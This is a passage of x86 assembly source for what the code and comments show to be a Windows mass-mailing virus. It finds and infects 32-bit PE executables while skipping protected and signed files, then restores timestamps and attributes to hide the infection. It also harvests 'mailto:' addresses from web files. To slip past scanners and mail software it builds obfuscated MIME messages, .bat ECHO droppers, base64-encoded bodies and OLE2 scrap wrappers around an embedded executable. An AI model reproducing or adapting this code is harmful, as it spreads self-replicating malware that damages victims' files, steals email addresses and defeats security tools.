           call    dword ptr [ebp + krncrcstk.kFindNextFileW]
           test    eax, eax
           jne     test_dirfile

   ;-----------------------------------------------------------------------------
   ;close find, and free list node
   ;-----------------------------------------------------------------------------

           push    edi
           mov     al, (krncrcstk.kFindClose - krncrcstk.klstrlenW) shr 2
           call    store_krnapi

   file_prev       label   near
           push    esi
           mov     esi, dword ptr [esi + findlist.findprev]
           call    cGlobalFree
           test    esi, esi
           je      file_exit

   step_updir      label   near

   ;-----------------------------------------------------------------------------
   ;the ANSI string ".." can be used, even on Unicode platforms
   ;-----------------------------------------------------------------------------

           push    '..'
           push    esp
           call    cSetCurrentDirectoryA
           pop     eax
           jmp     file_next

   test_file       label   near

   ;-----------------------------------------------------------------------------
   ;get full path and convert to Unicode if required (SFC requires Unicode path)
   ;-----------------------------------------------------------------------------

           push    eax                             ;save original file attributes for close
           mov     eax, ebp
           enter   MAX_PATH * 2, 0
           mov     ecx, esp
           push    eax
           push    esp
           push    ecx
           push    MAX_PATH
           push    edi
           call    dword ptr [eax + krncrcstk.kGetFullPathNameW]
           xchg    edi, eax
           pop     eax
           xor     ebx, ebx
           call    cGetVersion
           test    eax, eax
           jns     store_sfcapi
           mov     ecx, esp
           xchg    ebp, eax
           enter   MAX_PATH * 2, 0
           xchg    ebp, eax
           mov     eax, esp
           push    MAX_PATH
           push    eax
           inc     edi
           push    edi
           push    ecx
           push    ebx                             ;use default translation
           push    ebx                             ;CP_ANSI
           push    (krncrcstk.kMultiByteToWideChar - krncrcstk.klstrlenW) shr 2
           pop     eax
           call    store_krnapi

   store_sfcapi    label   near

   ;-----------------------------------------------------------------------------
   ;don't touch protected files
   ;-----------------------------------------------------------------------------

           mov     ecx, '!bgr'                     ;SfcIsFileProtected
           xor     eax, eax                        ;fake success in case of no SFC
           jecxz   leave_sfc
           push    esp
           push    ebx
           call    ecx

   leave_sfc       label   near
           leave
           test    eax, eax
           jne     restore_attr
           call    set_fileattr
           push    ebx
           push    ebx                             ;attribute ignored for existing files
           push    OPEN_EXISTING
           push    ebx
           push    ebx
           push    GENERIC_READ or GENERIC_WRITE
           push    edi
           call    dword ptr [ebp + krncrcstk.kCreateFileW]
           xchg    ebx, eax
           call    test_infect
           db      81h                             ;mask CALL
           call    infect_file                     ;Super Nashwan power ;)
           lea     eax, dword ptr [esi + findlist.finddata.ftLastWriteTime]
           push    eax
           sub     eax, 8
           push    eax
           sub     eax, 8
           push    eax
           push    ebx
           push    (krncrcstk.kSetFileTime - krncrcstk.klstrlenW) shr 2
           pop     eax
           call    store_krnapi
           push    ebx
           call    cCloseHandle

   restore_attr    label   near
           pop     ebx                             ;restore original file attributes
           call    set_fileattr
           jmp     file_next
   find_files      endp

   ;-----------------------------------------------------------------------------
   ;look for MZ and PE file signatures
   ;-----------------------------------------------------------------------------

   is_pehdr        proc    near                    ;edi -> map view
           cmp     word ptr [edi], 'ZM'            ;Windows does not check 'MZ'
           jne     pehdr_ret
           mov     esi, dword ptr [edi + mzhdr.mzlfanew]
           add     esi, edi
           lods    dword ptr [esi]                 ;SEH protects against bad lfanew value
           add     eax, -'EP'                      ;anti-heuristic test filetype ;) and clear EAX

   pehdr_ret       label   near
           ret                                     ;if PE file, then eax = 0, esi -> COFF header, Z flag set
   is_pehdr        endp

   ;-----------------------------------------------------------------------------
   ;reset/set read-only file attribute
   ;-----------------------------------------------------------------------------

   set_fileattr    proc    near                    ;ebx = file attributes, esi -> findlist, ebp -> platform APIs
           push    ebx
           lea     edi, dword ptr [esi + findlist.finddata.cFileName]
           push    edi
           call    dword ptr [ebp + krncrcstk.kSetFileAttributesW]
           ret                                     ;edi -> filename
           db      "24/05/02"
   set_fileattr    endp

   ;-----------------------------------------------------------------------------
   ;test if file is infectable (not protected, PE, x86, non-system, not infected, etc)
   ;-----------------------------------------------------------------------------

   test_infect     proc    near                    ;esi = find data, edi = map view, ebp -> platform APIs
           call    map_view
           mov     ebp, esi
           call    is_pehdr
           jne     inftest_name
           lods    dword ptr [esi]
           cmp     ax, IMAGE_FILE_MACHINE_I386
           jne     inftest_ret                     ;only Intel 386+
           shr     eax, 0dh                        ;move high 16 bits into low 16 bits and multiply by 8
           lea     edx, dword ptr [eax * 4 + eax]  ;complete multiply by 28h (size pesect)
           mov     eax, dword ptr [esi + pehdr.pecoff.peflags - pehdr.pecoff.petimedate]

   ;-----------------------------------------------------------------------------
   ;IMAGE_FILE_BYTES_REVERSED_* bits are rarely set correctly, so do not test them
   ;no .dll files this time
   ;-----------------------------------------------------------------------------

           test    ah, (IMAGE_FILE_SYSTEM or IMAGE_FILE_DLL or IMAGE_FILE_UP_SYSTEM_ONLY) shr 8
           jne     inftest_ret

   ;-----------------------------------------------------------------------------
   ;32-bit executable file...
   ;-----------------------------------------------------------------------------

           and     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
           cmp     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
           jne     inftest_ret                     ;cannot use xor+jpo because 0 is also jpe

   ;-----------------------------------------------------------------------------
   ;the COFF magic value is not checked because Windows ignores it anyway
   ;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+
   ;-----------------------------------------------------------------------------

           add     esi, pehdr.pesubsys - pehdr.pecoff.petimedate
           lods    dword ptr [esi]
           cmp     ax, IMAGE_SUBSYSTEM_WINDOWS_CUI
           jnbe    inftest_ret
           cmp     al, IMAGE_SUBSYSTEM_WINDOWS_GUI ;al not ax, because ah is known now to be 0
           jb      inftest_ret
           shr     eax, 1eh                        ;test eax, IMAGE_DLLCHARACTERISTICS_WDM_DRIVER shl 10h
           jb      inftest_ret

   ;-----------------------------------------------------------------------------
   ;avoid files which seem to contain attribute certificates
   ;because one of those certificates might be a digital signature
   ;-----------------------------------------------------------------------------

           cmp     dword ptr [esi + pehdr.pesecurity.dirrva - pehdr.pestackmax], eax
           jnbe    inftest_ret

   ;-----------------------------------------------------------------------------
   ;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size
   ;the Optional Header can be larger than the offset of the last directory
   ;remember: even if you have not seen it does not mean that it does not happen :)
   ;-----------------------------------------------------------------------------

           movzx   eax, word ptr [esi + pehdr.pecoff.peopthdrsize - pehdr.pestackmax]
           add     eax, edx
           mov     ebx, dword ptr [esi + pehdr.pefilealign - pehdr.pestackmax]
           lea     esi, dword ptr [esi + eax - pehdr.pestackmax + pehdr.pemagic - size pesect + pesect.sectrawsize]
           lods    dword ptr [esi]
           add     eax, dword ptr [esi]
           cmp     dword ptr [ebp + findlist.finddata.dwFileSizeLow], eax
           jne     inftest_ret                     ;file contains appended data
           add     dword ptr [ebp + findlist.finddata.dwFileSizeLow], ebx
           inc     dword ptr [esp + mapsehstk.mapsehinfret]
                                                   ;skip call mask

   inftest_ret     label   near
           int     3

   ;-----------------------------------------------------------------------------
   ;if suffix is any of .asp, .cfm, .css, .jsp, .[?]php* .[?]htm*
   ;then search for "mailto:" and save address if '@' is found
   ;-----------------------------------------------------------------------------

   inftest_name    label   near
           call    cGetVersion
           shr     eax, 1fh
           dec     ax
           mov     al, 0ffh
           xchg    ebx, eax
           lea     eax, dword ptr [ebp + findlist.finddata.cFileName]

   store_charnext  label   near
           mov     esi, "!bgr"

   find_suffix     label   near
           push    eax
           call    esi
           mov     ecx, dword ptr [eax]
           and     ecx, ebx
           je      inftest_ret
           cmp     ecx, '.'
           jne     find_suffix                     ;support only one suffix
           mov     cl, 4
           push    edi

   get_suffix      label   near
           push    ecx
           push    eax
           call    esi
           pop     ecx
           mov     edx, dword ptr [eax]
           test    dh, bh
           jne     inftest_ret                     ;Unicode character
           or      dl, ' '                         ;convert to lowercase
           shrd    edi, edx, 8
           loop    get_suffix
           xchg    edi, eax
           cmp     eax, " psa"                     ;.asp
           je      found_text
           cmp     eax, " mfc"                     ;.cfm
           je      found_text
           cmp     eax, " ssc"                     ;.css
           je      found_text
           cmp     eax, " psj"                     ;.jsp
           je      found_text
           cmp     al, 'p'
           je      and_suffix
           cmp     al, 'h'
           je      and_suffix
           shr     eax, 8                          ;skip first character

   and_suffix      label   near
           shl     eax, 8
           cmp     eax, "php" shl 8                ;.[?]php
           je      found_text
           cmp     eax, "mth" shl 8                ;.[?]htm
           jne     inftest_ret

   found_text      label   near
           pop     edi
           dec     ecx                             ;page fault exit if no mailto:

   find_mailto     label   near
           mov     al, 'm'
           repne   scas byte ptr [edi]
           jne     inftest_ret
           cmp     dword ptr [edi], "tlia"
           jne     find_mailto
           cmp     word ptr [edi + 4], ":o"
           jne     find_mailto
           cdq
           lea     esi, dword ptr [edi + 6]
           mov     ebp, esi

   find_mailend    label   near
           lods    byte ptr [esi]
           cmp     al, '@'
           jne     skip_at
           inc     edx

   skip_at         label   near
           or      al, 5                           ;" -> '
           cmp     al, "'"
           jne     find_mailend
           dec     edx
           jne     mailtest_ret                    ;too few or too many '@'s
           mov     ecx, esi
           dec     esi
           sub     ecx, ebp
           lea     edi, dword ptr [ecx + offset mail_recip - offset junkmail_inf + expsize + 400fffh]

   ;-----------------------------------------------------------------------------
   ;no thread sync because EnterCriticalSection is forwarded in NT/2000/XP
   ;and my import resolver doesn't support forwarded imports
   ;the solution is to write in reverse direction which avoids crash
   ;-----------------------------------------------------------------------------

           std
           rep     movs byte ptr [edi], byte ptr [esi]
           cld

   mailtest_ret    label   near
           int     3

   decomptest      proc    near
           push    1
           pop     ebp
           push    ebp
           btr     eax, 7
           jnb     decompcall
           xchg    ebp, eax
           pop     eax
           call    random
           xor     edx, edx
           div     ebp
           sub     ebp, edx
           push    ebp
           lea     ebp, dword ptr [edx + 1]
           xchg    edi, eax

   decompfirst     label   near
           xchg    edi, eax
           lods    byte ptr [esi]

   decompcall      label   near
           push    edi
           call    decompress
           pop     eax
           dec     ebp
           jne     decompfirst
           jmp     decompmulti

   decomplast      label   near
           push    ecx
           push    edi
           lods    byte ptr [esi]
           call    decompress
           pop     edi

   decompmulti     label   near
           pop     ecx
           loop    decomplast

   decompmain      label   near
           xor     eax, eax
           lods    byte ptr [esi]
           test    al, al
           jne     decomptest
           ret
   decomptest      endp

   ;-----------------------------------------------------------------------------
   ;4/5-bit text decompressor by RT Fishel, based on algorithm by qkumba in 1986!
   ;decompresses A-Z, a-z, 0-9, 3 user characters, lookup table for more characters
   ;-----------------------------------------------------------------------------

   decompress      proc    near                    ;al -> src length, esi -> src buffer, edi -> dst buffer
           xchg    ebx, eax
           mov     cx, ('!' shl 8)
           mov     edx, (1fh shl 8) + 5
           call    decomploop
                   db      user1, user2, user3
   endif

   usertable       db      ".;)", 0dh, "(:%=^,<>?#+@[!$'*]_"
                                                   ;max 32 characters, sort by frequency for best compression
   usertable_e     equ     $

   if (offset usertable_e - offset usertable) gt 32
           .err    "too many user characters"
   endif

   ife compress_only

   decompbase      label   near
           xor     dx, (10h shl 8) + 1
           jmp     decomploop

   decompcase      label   near
           xor     ch, 'a' - 1

   decomploop      label   near
           call    decompload
           cmp     dl, 5
           je      decompcmp
           or      al, 10h

   decompcmp       label   near
           cmp     al, 1ah                         ;case switch
           je      decompcase
           jb      decompimm
           sub     al, 1ch
           jb      decompbase
           and     al, dh
           jne     decompuser
           call    decompload

           ;this instruction appears twice because the "add al, 3"
           ;can overflow in 4-bit mode.  if "and al, dh" appears
           ;after that, then the result is wrong character

           and     al, dh
           add     al, 3                           ;skip user1, user2, user3

   decompuser      label   near
           add     eax, dword ptr [esp]
           mov     al, byte ptr [eax - 1]
           cmp     al, 0dh
           jne     decompstore
           stos    byte ptr [edi]
           mov     al, 0ah
           jmp     decompstore

   decompimm       label   near
           add     al, ' '
           cmp     dl, 4
           je      decompstore
           add     al, ch

   decompstore     label   near
           stos    byte ptr [edi]
           dec     bl
           jne     decomploop
           test    cl, cl
           je      decomppop
           inc     esi

   decomppop       label   near
           pop     eax
           ret

   decompload      proc    near
           mov     eax, dword ptr [esi]
           bswap   eax
           add     cl, dl
           rol     eax, cl
           cmp     cl, 8
           jb      decompldret
           sub     cl, 8
           inc     esi

   decompldret     label   near
           and     eax, 1fh
           ret
   decompload      endp
   decompress      endp

   ;-----------------------------------------------------------------------------
   ;fill random number of lines with random number of random characters
   ;-----------------------------------------------------------------------------

   randlines       proc    near
           call    random
           and     eax, 7
           inc     eax
           xchg    edx, eax

   randloop        label   near
           call    random
           and     eax, 63                         ;highest power of 2, -1, <= 76
           inc     eax
           xchg    ebp, eax
           call    randline
           dec     edx
           jne     randloop

   randword        proc    near
           push    8
           pop     ebp

   randline        proc    near
           call    random
           and     al, 1fh
           cmp     al, 19h
           jnbe    randline
           add     al, 'A'
           stos    byte ptr [edi]
           dec     ebp
           jne     randline

   store_crlf      proc    near
           mov     ax, 0a0dh
           stos    word ptr [edi]
           ret
   store_crlf      endp
   randline        endp
   randword        endp
   randlines       endp

   ;-----------------------------------------------------------------------------
   ;insert random comments into MIME headers, to fool non-compliant MIME software
   ;this includes some Microsoft products, such as Internet Mail And News :(
   ;map case randomly
   ;-----------------------------------------------------------------------------

   decompcomcr     proc    near
           push    offset store_crlf - offset junkmail_inf + expsize + 401000h

   decompcomnt     proc    near
           push    edi
           push    ebp
           call    decompmain
           pop     ebp
           sub     ebp, 71                         ;highest multiple of 4, < 76, -1
           neg     ebp
           pop     eax

   decompname      proc    near
           push    esi
           mov     ecx, edi
           sub     ecx, eax
           add     edi, ebp
           mov     esi, eax
           push    ecx
           push    edi
           rep     movs byte ptr [edi], byte ptr [esi]
           pop     esi
           pop     ebx
           xchg    edi, eax

   ;-----------------------------------------------------------------------------
   ;copy up to 3 original characters, always at least 1
   ;if no room for more comments, then copy remainder and quit
   ;-----------------------------------------------------------------------------

   comnt_copy      label   near
           call    random
           and     eax, 3
           jne     force_copy
           inc     eax

   force_copy      label   near
           cmp     bl, al
           jbe     comnt_ret
           cmp     ebp, ebx
           jbe     comnt_ret
           sub     bl, al
           sub     ebp, eax
           xchg    ecx, eax
           call    randcase

   ;-----------------------------------------------------------------------------
   ;insert up to 3 random comment characters, always at least 1
   ;-----------------------------------------------------------------------------

           call    random
           and     eax, 3
           jne     force_store
           inc     eax

   force_store     label   near
           sub     ebp, eax
           dec     ebp
           dec     ebp
           push    ebp
           xchg    ebp, eax
           mov     al, '('
           stos    byte ptr [edi]

   ;-----------------------------------------------------------------------------
   ;printable character from 20 ( ) to 7e (~), except '(', ')', and '\'
   ;cannot use '(' or ')' because comments can be nested, '\' has special meaning
   ;-----------------------------------------------------------------------------

   comnt_add       label   near
           call    random
           and     al, 7fh
           cmp     al, ' ' + 1
           jb      comnt_add
           cmp     al, '(' + 1
           jb      comnt_bound
           cmp     al, ')' + 1
           jbe     comnt_add
           cmp     al, '\' + 1
           je      comnt_add

   comnt_bound     label   near
           dec     eax
           stos    byte ptr [edi]
           dec     ebp
           jne     comnt_add
           mov     al, ')'
           stos    byte ptr [edi]
           pop     ebp
           jmp     comnt_copy

   comnt_ret       label   near
           mov     ecx, ebx
           jecxz   comnt_skip
           call    randcase

   comnt_skip      label   near
           pop     esi
           ret

   randcase        proc    near
           push    ecx
           call    random
           lods    byte ptr [esi]
           cmp     al, 40h
           jb      case_skip
           and     ah, 20h
           xor     al, ah

   case_skip       label   near
           stos    byte ptr [edi]
           pop     ecx
           loop    randcase
           ret
   randcase        endp
   decompname      endp
   decompcomnt     endp
   decompcomcr     endp

   ;-----------------------------------------------------------------------------
   ;map case randomly without comments
   ;-----------------------------------------------------------------------------

   decompcmap      proc    near
           push    edi
           call    decompmain
           mov     ecx, edi
           pop     edi
           sub     ecx, edi
           push    esi
           mov     esi, edi
           call    randcase
           pop     esi
           push    offset part23 - offset part22 - 4
           pop     ebp
           ret
   decompcmap      endp

   ;-----------------------------------------------------------------------------
   ;this is a .bat transport using ECHO to emit a base64 encoded body
   ;it is converted later to a polymorphic octet stream
   ;-----------------------------------------------------------------------------

   decompbat       proc    near
           call    store_crlf
           mov     edx, edi
           sub     edx, esi
           push    esi
           push    edi

   bat_copyecho    label   near
           mov     eax, "OHCE"
           stos    dword ptr [edi]
           mov     al, ' '
           stos    byte ptr [edi]
           push    76
           pop     ecx
           dec     edx
           dec     edx
           sub     edx, ecx
           rep     movs byte ptr [edi], byte ptr [esi]
           jnb     bat_skipadd
           add     edi, edx

   ;-----------------------------------------------------------------------------
   ;remove trailing '=' to ensure proper transport
   ;-----------------------------------------------------------------------------

   bat_skipadd     label   near
           mov     al, '='
           cmp     al, 'r'                         ;mask DEC EDI
           org     $ - 1
   bat_skipeq      label   near
           dec     edi
           dec     edi
           scas    byte ptr [edi]
           je      bat_skipeq
           mov     al, '>'
           stos    byte ptr [edi]
           push    esi
           mov     esi, ebx
           movs    dword ptr [edi], dword ptr [esi]
           movs    dword ptr [edi], dword ptr [esi]
           movs    dword ptr [edi], dword ptr [esi]
           movs    dword ptr [edi], dword ptr [esi]
           pop     esi
           inc     esi
           inc     esi
           dec     edi
           test    edx, edx
           jnle    bat_copyecho
           mov     cl, 1ah
           lea     esi, dword ptr [edi - 0eh]
           rep     movs byte ptr [edi], byte ptr [esi]
           pop     esi
           mov     ecx, edi
           sub     ecx, esi
           pop     edi
           mov     eax, edi
           rep     movs byte ptr [edi], byte ptr [esi]
           jmp     formoctet
   decompbat       endp

   ;-----------------------------------------------------------------------------
   ;randomly convert characters to octets to fool string scanners
   ;automatically wraps long lines (eg batdrop)
   ;-----------------------------------------------------------------------------

   decompoct       proc    near
           push    edi
           call    decompmain
           pop     eax

   formoctet       label   near
           push    esi
           push    eax
           push    edi
           mov     ecx, edi
           sub     ecx, eax
           xchg    esi, eax

   octet_line      label   near
           jecxz   octet_copy
           push    72                              ;highest safe multiple of 3, < 76
           pop     ebp

   ;-----------------------------------------------------------------------------
   ;don't process '=' if used as line-continue character
   ;-----------------------------------------------------------------------------

   octet_check     label   near
           mov     eax, dword ptr [esi]
           cmp     ax, 0d3dh
           je      octet_eqcrlf
           cmp     al, 0dh
           je      octet_crlf
           test    ebp, ebp
           jle     octet_break                     ;signed compare in case of < 0

   ;-----------------------------------------------------------------------------
   ;randomly process any character
   ;-----------------------------------------------------------------------------

           call    random
           test    al, 1
           lods    byte ptr [esi]
           jne     octet_make

   ;-----------------------------------------------------------------------------
   ;always process '=' character
   ;-----------------------------------------------------------------------------

           cmp     al, '='
           jne     octet_skip

   octet_make      label   near
           mov     byte ptr [edi], '='
           inc     edi
           aam     10h
           cmp     al, 0ah
           sbb     al, 69h
           das
           xchg    ah, al
           cmp     al, 0ah
           sbb     al, 69h
           das
           stos    byte ptr [edi]
           dec     ebp
           dec     ebp
           mov     al, ah

   octet_skip      label   near
           stos    byte ptr [edi]
           dec     ebp
           loop    octet_check

   octet_copy      label   near
           pop     esi
           mov     ecx, edi
           sub     ecx, esi
           pop     edi
           rep     movs byte ptr [edi], byte ptr [esi]
           pop     esi
           ret

   octet_eqcrlf    label   near
           movs    byte ptr [edi], byte ptr [esi]
           dec     ecx

   octet_crlf      label   near
           movs    word ptr [edi], word ptr [esi]
           dec     ecx
           dec     ecx
           jmp     octet_line

   octet_break     label   near
           mov     eax, 0a0d3dh
           stos    dword ptr [edi]
           dec     edi
           jmp     octet_line
   decompoct       endp

   bound_copy      proc    near
           push    esi
           xchg    ecx, eax
           xchg    esi, eax
           rep     movs byte ptr [edi], byte ptr [esi]
           pop     esi
           jmp     store_crlf
   bound_copy      endp

   decomprand      proc    near
           push    edi
           call    decompmain                      ;subject
           call    random
           and     al, 1
           pop     eax
           jne     decomprand_ret
           xchg    edi, eax

   decomprand_ret  label   near
           ret
   decomprand      endp

   decomptype      proc    near
           mov     eax, ('--' shl 10h) + 0a0dh
           stos    dword ptr [edi]
           pop     edx
           pop     eax
           pop     ecx
           push    ecx
           push    eax
           push    edx
           call    bound_copy
           push    esi

   patch_type      label   near
           mov     esi, 'RTF!'
           call    decompcmap
           pop     esi
           push    offset part12 - offset part11 - 2
           pop     ebp
           jmp     decompcomnt
   decomptype      endp

   ;-----------------------------------------------------------------------------
   ;base64 encoder without dictionary by RT Fishel
   ;-----------------------------------------------------------------------------

   b64_newline     proc    near
           call    store_crlf

   b64encode       label   near                    ;ebp = length, esi -> src buffer, edi -> dst buffer
           push    (76 shr 2) + 1
           pop     edx

   b64_outer       label   near
           dec     edx
           je      b64_newline
           lods    dword ptr [esi]
           dec     esi
           inc     ebp
           bswap   eax
           push    4
           pop     ecx

   b64_inner       label   near
           rol     eax, 6
           and     al, 3fh
           cmp     al, 3eh
           jb      b64_testchar
           shl     al, 2                           ;'+' and '/' differ by only 1 bit
           sub     al, ((3eh shl 2) + 'A' - '+') and 0ffh

   b64_testchar    label   near
           sub     al, 4
           cmp     al, '0'
           jnl     b64_store                       ;l not b because '/' is still < 0 here
           add     al, 'A' + 4
           cmp     al, 'Z'
           jbe     b64_store
           add     al, 'a' - 'Z' - 1

   b64_store       label   near
           stos    byte ptr [edi]
           dec     ebp
           loopne  b64_inner
           jne     b64_outer
           mov     al, '='
           rep     stos byte ptr [edi]
           ret
   b64_newline     endp

   ;-----------------------------------------------------------------------------
   ;decompress scrap (OLE2) header
   ;-----------------------------------------------------------------------------

   decompscrap     proc    near                    ;edi -> dst buffer
           push    edi
           push    esi
           xor     ecx, ecx
           mov     edi, ebx
           call    decomprle

   ;-----------------------------------------------------------------------------
   ;this is a 512 bytes-per-page OLE2 file that works in 9x/Me/NT/2000/XP
   ;it uses the standard OLE2 signature (D0 CF 11 E0 A1 B1 1A E1), because OLE2
   ;beta signature (0E 11 FC 0D A1 B1 1A E1) is not supported by Windows 2000/XP
   ;the shift count is 9, so it is not affected by the new OLE2 header size bug
   ;it supports <= 32256 bytes files, because FAT table is a single page
   ;file must be >= 4096 bytes long, this is an OLE2 limitation
   ;there is header field to control this, but is ignored for values < 4096
   ;
   ;256 bytes-per-page OLE2 file works in 9x/Me/NT, for <= 16128 bytes files
   ;it is possible in 2000/XP (needs many tricks), for <= 15872 bytes files only
   ;this restriction is because of a bug in the 2000/XP OLE2 implementation
   ;in the OLE2 specification, the file header is fixed at 512 bytes long, and
   ;the default shift count is 9, but someone at Microsoft thought that these
   ;values are related and now the shift count applies to the file header, too
   ;this means that using a shift count < 9 will read bytes from the file header,
   ;instead of the first page
   ;it is similar to changing the header paragraph count to 0 in DOS MZ files
   ;the correct behaviour for OLE2 is to use a base file offset, which value is
   ;1 << ((shift < 9) ? 9 : shift) to support large headers but 512 bytes minimum
   ;but there is more chance that Microsoft will never notice this bug anyway
   ;-----------------------------------------------------------------------------

   scrapsize       equ     616h
   ;RLE-based compressed OLE2 scrap file
   ;execution continues immediately after compressed data.  be careful ;)

           dd      11111110011110001111001101100001b
           ;       mmmmmmmz   0fz   07mz   0dmz   02
           db      0d0h, 0cfh, 11h, 0e0h, 0a1h, 0b1h, 1ah, 0e1h, 9, 1
           dd      0

           inc     eax
           inc     edi
           stos    byte ptr [edi]
           add     edi, 1d3h
           not     eax
           stos    dword ptr [edi]
           add     edi, 1f8h
           call    decomprle

           dd      00000110000011000001100000111100b
           ;       z   01mz   01mz   01mz   01mmm
           db      1, 'O', 'l', 'e', '1', 0, '0'
           dd      00000110000011000001100000111100b
           ;       z   01mz   01mz   01mz   01mmm
           db      'N', 'a', 't', 'i', 0, 'v'
           dd      00000110011110011110010111000001b
           ;       z   01mz   0fz   0fz   0bmz   01
           db      'e', 1ah
           dd      10000010110001001111001111001001b
           ;       mz   01f   08mz   0fz   0fz   09
           db      2, 1
           dd      10010111000001100000110000011110b
           ;       mz   0bmz   01mz   01mz   01mmm
           db      2, 3, 'I', 'T', 'E', 0, 'M'
           dd      00000110000011000001100111100111b
           ;       z   01mz   01mz   01mz   0fz   0e
           db      '0', '0', '0'
           dd      00111100010110000011000001011000b
           ;       z   0fz   05mz   01mz   01f   08
           db      12h, 1
           dd      00010010000011000101100011010000b
           ;       z   04mz   01mz   05mz   06m
           db      0ch, 3, 0c0h, 46h
           dd      0

           add     edi, 126h
           call    decomprle

           dd      00000110000111111100000000000000b
           ;       z   01mz   03mmmmm
           db      3, 6, "\.exe"
           dd      0

   ;decompressed data follow
   ;       db      0d0h, 0cfh, 11h, 0e0h, 0a1h, 0b1h, 1ah, 0e1h
   ;                                       ;000 signature
   ;       db      10h dup (0)             ;008 unused
   ;       dw      0, 0                    ;018 DLL version
   ;       dw      0                       ;01c byte order (for Unicode)
   ;       dw      9                       ;01e shift count for main FAT
   ;       dw      0                       ;020 shift count for mini FAT
   ;       dw      0                       ;022 reserved
   ;       dd      0, 0                    ;024 reserved
   ;       dd      1                       ;02c pages in main FAT
   ;       dd      1                       ;030 page of root storage
   ;       dd      0                       ;034 unused
   ;       dd      0                       ;038 size of main pages
   ;       dd      0                       ;03c page of mini FAT
   ;       dd      0                       ;040 pages in mini FAT
   ;       dd      0                       ;044 next page in main FAT (end of chain)
   ;       dd      0                       ;048 unused
   ;       dd      6dh dup (0)             ;04c filler
   ;       dd      0                       ;200 main FAT page
   ;       dd      0fffffffeh              ;204 root storage chain
   ;       dd      ? dup (?)               ;208 embedded object stream chain (variable size)
   ;       dw      1, "Ole10Native", 14h dup (0)
   ;                                       ;400 stream name
   ;       dw      1ah                     ;440 name length
   ;       db      2                       ;442 attribute (2=stream, unchecked for Root Storage)
   ;       db      0                       ;443 unused
   ;       dd      0ffffffffh, 0ffffffffh  ;444 left and right node indexes
   ;       dd      1                       ;44c storage index (overload as Root Storage)
   ;       db      10h dup (0)             ;450 CLSID
   ;       dd      0                       ;460 flags
   ;       dq      0, 0                    ;464 create and modify times
   ;       dd      2                       ;474 data page
   ;       dd      ?                       ;478 stream size
   ;       dd      0                       ;47c unused
   ;       dw      3, "ITEM000", 18h dup (0)
   ;                                       ;480 scrap storage name
   ;       dw      12h                     ;4c0 name length
   ;       db      1                       ;4c2 attribute (1=storage)
   ;       db      0                       ;4c3 unused
   ;       dd      0ffffffffh, 0ffffffffh  ;4c4 left and right node indexes
   ;       dd      0                       ;4cc storage index
   ;       CLSID   0003000c-0000-0000-00c0-000000000046
   ;                                       ;4d0 scrap CLSID
   ;       dd      0                       ;4e0 flags
   ;       dq      0, 0                    ;4e4 create and modify times
   ;       dd      0                       ;4f4 data page (unused by storages)
   ;       dd      0                       ;4f8 stream size
   ;       dd      0                       ;4fc unused
   ;       dd      40h dup (0)             ;500 unused directory entries
   ;       dd      ?                       ;600 scrap size
   ;       dw      0                       ;604 number of strings following
   ;       dw      3                       ;606 type (3=static)
   ;       dd      6                       ;608 filename length
   ;       db      "\.exe", 0              ;60c filename (only directory and suffix required)
   ;       dd      ?                       ;612 embedded object size
   ;                                       ;616

           lea     ecx, dword ptr [ebp + 12h]      ;add embedded object header size
           mov     dword ptr [edi - 11h], ecx      ;embedded object size (with header)
           mov     dword ptr [edi + 1], ebp        ;embedded object size (without header)
           add     ecx, 4
           mov     dword ptr [ebx + 478h], ecx     ;stream size
           mov     al, 3
           shr     ecx, 9
           lea     edi, dword ptr [ebx + 208h]     ;first entry in FAT

   store_list      label   near
           stos    dword ptr [edi]
           inc     eax
           loop    store_list
           pop     esi
           add     ebp, esi                        ;include scrap header size
           xor     esi, esi
           pop     edi
           ret
   decompscrap     endp

   decomprle       proc    near
           pop     esi
           lods    dword ptr [esi]

   copy_bytes      label   near
           movs    byte ptr [edi], byte ptr [esi]

   test_bits       label   near
           add     eax, eax
           jb      copy_bytes
           add     eax, eax
           sbb     dl, dl
           shld    ecx, eax, 4
           shl     eax, 4
           xchg    edx, eax
           rep     stos byte ptr [edi]
           xchg    edx, eax
           jne     test_bits
           lods    dword ptr [esi]
           test    eax, eax
           jne     test_bits
           jmp     esi
   decomprle       endp

   ;-----------------------------------------------------------------------------
   ;increase file size by random value (between RANDPADMIN and RANDPADMAX bytes)
   ;I use GetTickCount() instead of RDTSC because RDTSC can be made privileged
   ;-----------------------------------------------------------------------------

   open_append     proc    near
           push    (krncrcstk.kGetTickCount - krncrcstk.klstrlenW) shr 2
           pop     eax
           call    store_krnapi
           and     eax, RANDPADMAX - 1
           add     ax, small (offset junkmail_codeend - offset junkmail_inf + RANDPADMIN)

   ;-----------------------------------------------------------------------------
   ;create file map, and map view if successful
   ;-----------------------------------------------------------------------------

   map_view        proc    near                    ;eax = extra bytes to map, ebx = file handle, esi -> findlist, ebp -> platform APIs
           add     eax, dword ptr [esi + findlist.finddata.dwFileSizeLow]
           xor     ecx, ecx
           push    eax
           push    eax                             ;MapViewOfFile
           push    ecx                             ;MapViewOfFile
           push    ecx                             ;MapViewOfFile
           push    FILE_MAP_WRITE                  ;Windows 9x/Me does not support FILE_MAP_ALL_ACCESS
           push    ecx
           push    eax
           push    ecx
           push    PAGE_READWRITE
           push    ecx
           push    ebx
           push    (krncrcstk.kCreateFileMappingA - krncrcstk.klstrlenW) shr 2
           pop     eax                             ;ANSI map is allowed because of no name
           call    store_krnapi
           push    eax
           xchg    edi, eax
           push    (krncrcstk.kMapViewOfFile - krncrcstk.klstrlenW) shr 2
           pop     eax
           call    store_krnapi
           pop     ecx
           xchg    edi, eax                        ;should succeed even if file cannot be opened
           pushad
           call    unmap_seh
           pop     eax
           pop     eax
           pop     esp
           xor     eax, eax
           pop     dword ptr fs:[eax]
           pop     eax
           popad                                   ;SEH destroys all registers
           push    eax
           push    edi
           push    (krncrcstk.kUnmapViewOfFile - krncrcstk.klstrlenW) shr 2
           pop     eax
           call    store_krnapi
           call    cCloseHandle
           pop     eax
           ret

   unmap_seh       proc    near
           cdq
           push    dword ptr fs:[edx]
           mov     dword ptr fs:[edx], esp
           jmp     dword ptr [esp + mapsehstk.mapsehsehret]
   unmap_seh       endp
   map_view        endp                            ;eax = map handle, ecx = new file size, edi = map view
   open_append     endp

   ;-----------------------------------------------------------------------------
